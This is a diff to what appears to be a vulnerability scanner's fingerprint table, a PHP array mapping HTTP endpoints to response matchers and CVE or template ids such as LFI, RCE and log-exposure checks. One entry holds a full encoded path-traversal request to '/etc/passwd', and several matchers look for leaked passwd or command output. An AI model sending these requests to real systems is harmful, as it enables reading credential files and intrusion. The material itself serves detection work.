+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'services:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'version: ',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'devops',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'docker-compose-config',
+          ),
+        ),
+        1 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'services:',
+          ),
+          'nf' => 
+          array (
+          ),
+          'pid' => 'route-docker-compose',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'route-docker-compose',
+          ),
+          'w' => 100000,
         ),
       ),
     ),
@@ -164309,6 +165691,41 @@ a</title>',
         ),
       ),
     ),
+    'GET /fetchBody' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => '"id":',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'alibaba',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'alibaba-anyproxy-lfi',
+          ),
+        ),
+      ),
+    ),
     'GET /fhem/FileLog_logWrapper' => 
     array (
       'b' => 
@@ -166405,8 +167822,6 @@ a</title>',
           's' => 200,
           'bw' => 
           array (
-            0 => '[fonts]',
-            1 => 'for 16-bit app support',
           ),
           'hw' => 
           array (
@@ -166418,6 +167833,7 @@ a</title>',
           'sz' => NULL,
           'rx' => 
           array (
+            0 => 'root:a:0:0:',
           ),
           'h' => 
           array (
@@ -166448,8 +167864,6 @@ a</title>',
           's' => 200,
           'bw' => 
           array (
-            0 => '[fonts]',
-            1 => 'for 16-bit app support',
           ),
           'hw' => 
           array (
@@ -166461,6 +167875,7 @@ a</title>',
           'sz' => NULL,
           'rx' => 
           array (
+            0 => 'root:a:0:0:',
           ),
           'h' => 
           array (
@@ -167187,6 +168602,52 @@ a</title>',
           't' => 
           array (
             0 => 'room-alert-detect',
+          ),
+        ),
+      ),
+    ),
+    'GET /gateway.conf' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'text/plain',
+          ),
+          'nf' => 
+          array (
+            0 => '<html',
+            1 => '<body',
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'credSSPs=s',
+            1 => 'htmls=s',
+            2 => 'ports=s',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'remote-spark',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'remote-spark-gateway-config',
+          ),
+          'th' => 
+          array (
+            'Content-Type' => 
+            array (
+              0 => 'text/plain',
+            ),
           ),
         ),
       ),
@@ -183144,6 +184605,48 @@ a</title>',
         ),
       ),
     ),
+    'GET /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'application/javascript',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'yonyou',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'yonyou-yonbip-lfi',
+          ),
+          'th' => 
+          array (
+            'Content-Type' => 
+            array (
+              0 => 'application/javascript',
+            ),
+          ),
+        ),
+      ),
+    ),
     'GET /iupjournals/index.php/esj' => 
     array (
       'b' => 
@@ -189486,9 +190989,6 @@ a</title>',
           's' => 200,
           'bw' => 
           array (
-            0 => 'bit app support',
-            1 => 'fonts',
-            2 => 'extensions',
           ),
           'hw' => 
           array (
@@ -189500,6 +191000,7 @@ a</title>',
           'sz' => NULL,
           'rx' => 
           array (
+            0 => 'root:a:0:0:',
           ),
           'h' => 
           array (
@@ -195961,9 +197462,6 @@ a</title>',
           's' => 200,
           'bw' => 
           array (
-            0 => 'bit app support',
-            1 => 'fonts',
-            2 => 'extensions',
           ),
           'hw' => 
           array (
@@ -195975,6 +197473,7 @@ a</title>',
           'sz' => NULL,
           'rx' => 
           array (
+            0 => 'root:a:0:0:',
           ),
           'h' => 
           array (
@@ -219362,6 +220861,49 @@ a</title>',
         ),
       ),
     ),
+    'GET /scripts/weglot.js' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'Weglot.initialize',
+          ),
+          'hw' => 
+          array (
+            0 => 'javascript',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'wg_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'weglot',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'weglot-api-key-exposure',
+          ),
+          'th' => 
+          array (
+            'Content-Type' => 
+            array (
+              0 => 'javascript',
+            ),
+          ),
+        ),
+      ),
+    ),
     'GET /search' => 
     array (
       'b' => 
@@ -227165,9 +228707,6 @@ a</title>',
           's' => 200,
           'bw' => 
           array (
-            0 => 'bit app support',
-            1 => 'fonts',
-            2 => 'extensions',
           ),
           'hw' => 
           array (
@@ -227178,6 +228717,7 @@ a</title>',
           'sz' => NULL,
           'rx' => 
           array (
+            0 => 'root:a:0:0:',
           ),
           'h' => 
           array (
@@ -233463,9 +235003,6 @@ a</title>',
           's' => 200,
           'bw' => 
           array (
-            0 => 'bit app support',
-            1 => 'fonts',
-            2 => 'extensions',
           ),
           'hw' => 
           array (
@@ -233476,6 +235013,7 @@ a</title>',
           'sz' => NULL,
           'rx' => 
           array (
+            0 => 'root:a:0:0:',
           ),
           'h' => 
           array (
@@ -233499,9 +235037,6 @@ a</title>',
           's' => 200,
           'bw' => 
           array (
-            0 => 'bit app support',
-            1 => 'fonts',
-            2 => 'extensions',
           ),
           'hw' => 
           array (
@@ -233512,6 +235047,7 @@ a</title>',
           'sz' => NULL,
           'rx' => 
           array (
+            0 => 'root:a:0:0:',
           ),
           'h' => 
           array (
@@ -248559,6 +250095,43 @@ a</title>',
         ),
         33 => 
         array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'text/html',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'true',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'ays-chatgpt-assistant',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2024-7714',
+          ),
+          'th' => 
+          array (
+            'Content-Type' => 
+            array (
+              0 => 'text/html',
+            ),
+          ),
+          'x' => true,
+        ),
+        34 => 
+        array (
           's' => 301,
           'bw' => 
           array (
@@ -249463,6 +251036,76 @@ a</title>',
           't' => 
           array (
             0 => 'CVE-2023-6114',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/cache/log/000000/minify.log' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => '[/] [-]',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[AAA, 00 AAA 0000 00:00:00 +0000]',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'w3-total-cache',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2024-12008',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/cache/log/000000/pagecache.log' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => '[/] [-]',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[AAA, 00 AAA 0000 00:00:00 +0000]',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'w3-total-cache',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2024-12008',
           ),
         ),
       ),
@@ -254895,6 +256538,41 @@ a</title>',
         ),
       ),
     ),
+    'GET /wp-content/plugins/easy-google-fonts/error_log' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'PHP Fatal error:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[00-AAA-0000 00:00:00',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'low',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-easy-google-fonts-log-disclosure',
+          ),
+        ),
+      ),
+    ),
     'GET /wp-content/plugins/easy-google-fonts/readme.txt' => 
     array (
       'b' => 
@@ -257092,6 +258770,76 @@ a</title>',
           't' => 
           array (
             0 => 'CVE-2019-9618',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/plugins/gravityforms/debug.log' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'PHP Warning:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[[-aaa-0000 00:00:00 AAA] PHP',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'low',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-gravity-forms-log-disclosure',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/plugins/gravityforms/tmp/debug.log' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'PHP Warning:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[[-aaa-0000 00:00:00 AAA] PHP',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'low',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-gravity-forms-log-disclosure',
           ),
         ),
       ),
@@ -260301,6 +262049,41 @@ a</title>',
         ),
       ),
     ),
+    'GET /wp-content/plugins/newsletter/classes/Newsletter/Logs.php' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'PHP Fatal error:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[00-AAA-0000 00:00:00',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-newsletter-log-exposure',
+          ),
+        ),
+      ),
+    ),
     'GET /wp-content/plugins/newsletter/emails/blocks/cta/block.php' => 
     array (
       'b' => 
@@ -260369,6 +262152,41 @@ a</title>',
           't' => 
           array (
             0 => 'wp-newsletter-fpd',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/plugins/newsletter/error_log' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'PHP Fatal error:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[00-AAA-0000 00:00:00',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-newsletter-log-exposure',
           ),
         ),
       ),
@@ -261420,6 +263238,41 @@ a</title>',
           't' => 
           array (
             0 => 'wp-pretty-links-fpd',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/plugins/pretty-link/error_log' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'PHP Fatal error:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[00-AAA-0000 00:00:00',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'low',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-pretty-link-log-disclosure',
           ),
         ),
       ),
@@ -266535,6 +268388,41 @@ a</title>',
         ),
       ),
     ),
+    'GET /wp-content/plugins/wordpress-importer/error_log' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'PHP Fatal error:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[00-AAA-0000 00:00:00',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'low',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-importer-log-disclosure',
+          ),
+        ),
+      ),
+    ),
     'GET /wp-content/plugins/wordpress-importer/readme.txt' => 
     array (
       'b' => 
@@ -267125,6 +269013,41 @@ a</title>',
           't' => 
           array (
             0 => 'wordpress-wp-file-manager',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'filename="passwd',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress-file-upload',
+          'sev' => 'critical',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2024-9047',
           ),
         ),
       ),
@@ -270416,6 +272339,114 @@ a</title>',
         ),
       ),
     ),
+    'GET /wp-content/uploads/mailchimp-for-wp/debug-log.php' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => '<?php exit; ?>',
+            1 => 'MailChimp API',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[0000-00-00 00:00:00] ERROR:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-mailchimp-log-exposure',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/uploads/mc4wp-debug-log.php' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => '<?php exit; ?>',
+            1 => 'MailChimp API',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[0000-00-00 00:00:00] ERROR:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-mailchimp-log-exposure',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/uploads/mc4wp-debug.log' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => '<?php exit; ?>',
+            1 => 'MailChimp API',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[0000-00-00 00:00:00] ERROR:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-mailchimp-log-exposure',
+          ),
+        ),
+      ),
+    ),
     'GET /wp-content/uploads/pdf-invoices/' => 
     array (
       'b' => 
@@ -270482,6 +272513,78 @@ a</title>',
           't' => 
           array (
             0 => 'CVE-2023-6505',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/uploads/sites/1/mailchimp-for-wp/debug-log.php' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => '<?php exit; ?>',
+            1 => 'MailChimp API',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[0000-00-00 00:00:00] ERROR:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-mailchimp-log-exposure',
+          ),
+        ),
+      ),
+    ),
+    'GET /wp-content/uploads/sites/1/mc4wp-debug-log.php' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => '<?php exit; ?>',
+            1 => 'MailChimp API',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '[0000-00-00 00:00:00] ERROR:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'wordpress',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'wp-mailchimp-log-exposure',
           ),
         ),
       ),
@@ -275461,6 +277564,35 @@ a</title>',
           's' => 200,
           'bw' => 
           array (
+          ),
+          'hw' => 
+          array (
+            0 => 'application/qwik-json',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'cve2026',
+          'sev' => 'critical',
+          'sig' => 1,
+          't' => 
+          array (
+            0 => 'CVE-2026-27971',
+          ),
+        ),
+        11 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
             0 => 'besu',
           ),
           'hw' => 
@@ -275485,7 +277617,7 @@ a</title>',
             0 => 'besu-server-detect',
           ),
         ),
-        11 => 
+        12 => 
         array (
           's' => 200,
           'bw' => 
@@ -275514,7 +277646,7 @@ a</title>',
             0 => 'erigon-server-detect',
           ),
         ),
-        12 => 
+        13 => 
         array (
           's' => 200,
           'bw' => 
@@ -275543,7 +277675,7 @@ a</title>',
             0 => 'geth-server-detect',
           ),
         ),
-        13 => 
+        14 => 
         array (
           's' => 200,
           'bw' => 
@@ -275572,7 +277704,7 @@ a</title>',
             0 => 'nethermind-server-detect',
           ),
         ),
-        14 => 
+        15 => 
         array (
           's' => 200,
           'bw' => 
@@ -275601,7 +277733,7 @@ a</title>',
             0 => 'openethereum-server',
           ),
         ),
-        15 => 
+        16 => 
         array (
           's' => 200,
           'bw' => 
@@ -275630,7 +277762,7 @@ a</title>',
             0 => 'sequoiadb-default-login',
           ),
         ),
-        16 => 
+        17 => 
         array (
           's' => 200,
           'bw' => 
@@ -275659,7 +277791,7 @@ a</title>',
             1 => 'CVE-2021-31805',
           ),
         ),
-        17 => 
+        18 => 
         array (
           's' => 200,
           'bw' => 
@@ -275687,7 +277819,7 @@ a</title>',
             0 => 'fastjson-version',
           ),
         ),
-        18 => 
+        19 => 
         array (
           's' => 200,
           'bw' => 
@@ -275755,7 +277887,7 @@ a</title>',
             0 => 'Content-Type: text/html',
           ),
         ),
-        19 => 
+        20 => 
         array (
           's' => 200,
           'bw' => 
@@ -275783,7 +277915,7 @@ a</title>',
             0 => 'seowon-router-rce',
           ),
         ),
-        20 => 
+        21 => 
         array (
           's' => 200,
           'bw' => 
@@ -275811,7 +277943,7 @@ a</title>',
             0 => 'thinkphp-501-rce',
           ),
         ),
-        21 => 
+        22 => 
         array (
           's' => 200,
           'bw' => 
@@ -275839,7 +277971,7 @@ a</title>',
             0 => 'waf-detect',
           ),
         ),
-        22 => 
+        23 => 
         array (
           's' => 201,
           'bw' => 
@@ -275870,7 +278002,7 @@ a</title>',
             0 => 'CVE-2023-28121',
           ),
         ),
-        23 => 
+        24 => 
         array (
           's' => 405,
           'bw' => 
@@ -275900,7 +278032,7 @@ a</title>',
             0 => 'laravel-debug-infoleak',
           ),
         ),
-        24 => 
+        25 => 
         array (
           's' => 400,
           'bw' => 
@@ -275936,7 +278068,7 @@ a</title>',
             ),
           ),
         ),
-        25 => 
+        26 => 
         array (
           's' => 302,
           'bw' => 
@@ -275977,7 +278109,7 @@ a</title>',
           ),
           'x' => true,
         ),
-        26 => 
+        27 => 
         array (
           's' => 302,
           'bw' => 
@@ -276006,7 +278138,7 @@ a</title>',
             0 => 'leostream-default-login',
           ),
         ),
-        27 => 
+        28 => 
         array (
           's' => 400,
           'bw' => 
@@ -276034,7 +278166,7 @@ a</title>',
             0 => 'CVE-2015-2080',
           ),
         ),
-        28 => 
+        29 => 
         array (
           's' => 401,
           'bw' => 
@@ -276062,7 +278194,7 @@ a</title>',
             0 => 'CVE-2021-35250',
           ),
         ),
-        29 => 
+        30 => 
         array (
           's' => 302,
           'bw' => 
@@ -276097,7 +278229,7 @@ a</title>',
             ),
           ),
         ),
-        30 => 
+        31 => 
         array (
           's' => 302,
           'bw' => 
@@ -277385,6 +279517,52 @@ a</title>',
           array (
             0 => 'CVE-2026-1603',
           ),
+        ),
+      ),
+    ),
+    'POST /RestAPI/getAPIKey' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'opmcsrfcookie=',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => 
+          array (
+            'eq' => 34,
+          ),
+          'rx' => 
+          array (
+            0 => '0',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'manageengine-firewall-analyzer-manageengine-netflow-analyzer-manageengine-network-configuration-manager-manageengine-opmanager-manageengine-opmanager-msp-manageengine-opmanager-plus-manageengine-oputils',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2022-36923',
+          ),
+          'th' => 
+          array (
+            'Set-Cookie' => 
+            array (
+              0 => 'opmcsrfcookie=',
+            ),
+          ),
+          'x' => true,
         ),
       ),
     ),
@@ -282343,6 +284521,42 @@ a</title>',
         ),
       ),
     ),
+    'POST /autodiscover' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'response schema',
+          ),
+          'hw' => 
+          array (
+            0 => 'text/html',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'collaboration-server',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2019-9621',
+          ),
+        ),
+      ),
+    ),
     'POST /autodiscover/autodiscover.json' => 
     array (
       'b' => 
@@ -282602,6 +284816,40 @@ a</title>',
         ),
       ),
     ),
+    'POST /boss/servlet/document' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'boss-mini',
+          'sev' => 'critical',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2023-3643',
+          ),
+        ),
+      ),
+    ),
     'POST /bsh.servlet.BshServlet' => 
     array (
       'b' => 
@@ -282645,8 +284893,7 @@ a</title>',
           's' => 200,
           'bw' => 
           array (
-            0 => '59,32,102,111,114',
-            1 => 'STPreLoadManagement',
+            0 => 'STPreLoadManagement',
           ),
           'hw' => 
           array (
@@ -282657,6 +284904,7 @@ a</title>',
           'sz' => NULL,
           'rx' => 
           array (
+            0 => '114,111,111,116,58,a,58,48,58,48,58',
           ),
           'h' => 
           array (
@@ -283226,6 +285474,41 @@ a</title>',
           't' => 
           array (
             0 => 'CVE-2020-8515',
+          ),
+        ),
+      ),
+    ),
+    'POST /cgi-bin/mainfunction.cgi/cvmcfgupload' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'DWS',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'uid=( gid=(',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'vigor',
+          'sev' => 'critical',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2020-15415',
           ),
         ),
       ),
@@ -284564,6 +286847,50 @@ a</title>',
           't' => 
           array (
             0 => 'CVE-2024-7314',
+          ),
+          'th' => 
+          array (
+            'Content-Type' => 
+            array (
+              0 => 'application/json',
+            ),
+          ),
+        ),
+      ),
+    ),
+    'POST /de2api/datasource/getSchema' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'Exception calling',
+            1 => 'exec():',
+          ),
+          'hw' => 
+          array (
+            0 => 'application/json',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'uid=0agid=0a',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'dataease',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2025-49002',
           ),
           'th' => 
           array (
@@ -291017,6 +293344,41 @@ a</title>',
         ),
       ),
     ),
+    'POST /php/components/logs.php' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'Purge log',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'netalertx',
+          'sev' => 'critical',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2024-48766',
+          ),
+        ),
+      ),
+    ),
     'POST /php/dal.php' => 
     array (
       'b' => 
@@ -292457,6 +294819,41 @@ a</title>',
         ),
       ),
     ),
+    'POST /rep/login' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'cluster_mode_others',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'uid=( gid=( groups=(',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'sangfor',
+          'sev' => 'critical',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'sangfor-login-rce',
+          ),
+        ),
+      ),
+    ),
     'POST /res/j_security_check' => 
     array (
       'b' => 
@@ -292925,6 +295322,36 @@ a</title>',
           't' => 
           array (
             0 => 'CVE-2021-25281',
+          ),
+        ),
+        1 => 
+        array (
+          's' => 500,
+          'bw' => 
+          array (
+            0 => 'An unexpected error occurred',
+          ),
+          'hw' => 
+          array (
+            0 => 'CherryPy/.',
+            1 => 'application/json',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'salt',
+          'sev' => 'critical',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2020-16846',
           ),
         ),
       ),
@@ -295676,6 +298103,41 @@ a</title>',
           't' => 
           array (
             0 => 'CNVD-2022-43245',
+          ),
+        ),
+      ),
+    ),
+    'POST /web/google_analytics.php' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'ganalytics',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'uid=( gid=( groups=(',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'my-cloud-wdbctl0020hwt-firmware',
+          'sev' => 'critical',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2018-17153',
           ),
         ),
       ),
@@ -298892,6 +301354,42 @@ a</title>',
         ),
       ),
     ),
+    'PUT /api/v2/hoverfly/middleware' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 422,
+          'bw' => 
+          array (
+            0 => 'STDOUT:',
+            1 => 'hoverfly',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:x:0:0',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'cve2025',
+          'sev' => 'critical',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2025-54123',
